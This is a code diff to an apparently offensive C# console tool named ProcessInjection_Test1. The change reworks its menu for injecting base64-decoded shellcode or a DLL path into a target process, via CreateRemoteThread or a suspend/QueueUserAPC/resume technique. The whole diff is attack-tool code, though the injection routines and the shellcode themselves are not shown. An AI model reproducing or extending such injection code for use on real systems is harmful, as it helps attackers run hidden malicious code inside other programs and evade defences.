@@ -49,22 +49,23 @@ namespace ProcessInjection_Test1
             }
             
             string processName = args[0];
-            string type = args[1];            
+            string type = args[1];
+
+            Console.WriteLine("\n[+] Shellcode [1] or DLL Path [2]?");
+            string payload = Console.ReadLine();
 
             if (type == "crt")
             {
                 crt_Injection_Class crtInjection = new crt_Injection_Class();
                 Console.WriteLine("[!] Injecting via CreateRemoteThread()");
-                Console.WriteLine("[+] Shellcode [1] or DLL Path [2]?");
-                string path = Console.ReadLine();
                
-                if (path == "1")
+                if (payload == "1")
                 {
                     byte[] sc = Convert.FromBase64String(b64);
                     Console.WriteLine("[!] Injecting shellcode");
                     crtInjection.crt_Injection(processName, sc);
                 }
-                if (path == "2")
+                if (payload == "2")
                 {                    
                     if (!File.Exists(dllName))
                     {
@@ -79,15 +80,14 @@ namespace ProcessInjection_Test1
             {
                 sir_Injection_Class sirInjection = new sir_Injection_Class();
                 Console.WriteLine("[!] Injecting via Suspend, Inject, Resume / QueueUserAPC()");
-                Console.WriteLine("[+] Shellcode [1] or DLL Path [2]?");
-                string path = Console.ReadLine();
 
-                if (path == "1")
+                if (payload == "1")
                 {
+                    byte[] sc = Convert.FromBase64String(b64);
                     Console.WriteLine("[!] Injecting shellcode");
-                    sirInjection.sir_Injection(processName, false);
+                    sirInjection.sir_Injection(processName, sc);
                 }
-                if (path == "2")
+                if (payload == "2")
                 {
                     if (!File.Exists(dllName))
                     {
@@ -95,7 +95,7 @@ namespace ProcessInjection_Test1
                         Environment.Exit(1);
                     }
                     Console.WriteLine("[!] Injecting DLL Path");
-                    sirInjection.sir_Injection(processName, true);
+                    sirInjection.sir_Injection(processName, dllName);
                 }
             }
             
